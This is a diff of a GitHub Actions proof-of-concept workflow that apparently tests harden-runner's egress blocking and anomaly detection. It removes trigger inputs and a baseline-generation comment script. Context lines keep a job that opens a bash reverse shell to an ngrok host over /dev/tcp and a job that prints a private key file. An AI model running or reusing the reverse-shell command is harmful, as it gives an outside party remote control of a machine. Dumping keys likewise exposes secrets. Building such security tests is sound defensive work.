@@ -1,23 +1,12 @@
 name: Workflow for POCs
 on:
   workflow_dispatch:
-    inputs:
-      enable_anomalous_call:
-        description: 'Make anomalous outbound call'
-        required: false
-        default: false
-        type: boolean
-      run_only_anomalous:
-        description: 'Run only the anomalous-outbound-call job'
-        required: false
-        default: false
-        type: boolean
 
 jobs:
   unauthorized-outbound-call:
-    runs-on: [self-hosted, ec2]
+    runs-on: ubuntu-latest
     steps:
-    - uses: step-security/harden-runner@rc
+    - uses: Prateek-stepsecurity/harden-runner@int
       with:
          egress-policy: block
          allowed-endpoints: >
@@ -41,7 +30,6 @@ jobs:
           bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1" 
 
   handle-private-key:
-    if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
     runs-on: ubuntu-latest
     steps:
     - uses: Prateek-stepsecurity/harden-runner@int
@@ -63,29 +51,6 @@ jobs:
         echo "Private key content:"
         cat private_key.pem
   anomalous-outbound-call:
-    # Baseline Generation Script:
-    # To quickly run this job 100 times for baseline generation, use this script:
-    #
-    # #!/bin/bash
-    # OWNER="your-github-username"
-    # REPO="your-repo-name"
-    # WORKFLOW_FILE="poc_workflow.yml"
-    #
-    # echo "Running anomalous job 100 times for baseline generation..."
-    # for i in {1..100}; do
-    #   echo "Triggering baseline run #$i"
-    #   gh workflow run "$WORKFLOW_FILE" \
-    #     --repo "$OWNER/$REPO" \
-    #     --field enable_anomalous_call=false \
-    #     --field run_only_anomalous=true &
-    #   
-    #   # Add small delay every 20 requests to avoid rate limiting
-    #   if (( i % 20 == 0 )); then
-    #     sleep 1
-    #   fi
-    # done
-    # wait
-    # echo "All 100 baseline runs triggered!"
     runs-on: ubuntu-latest
     steps:
     - uses: Prateek-stepsecurity/harden-runner@int
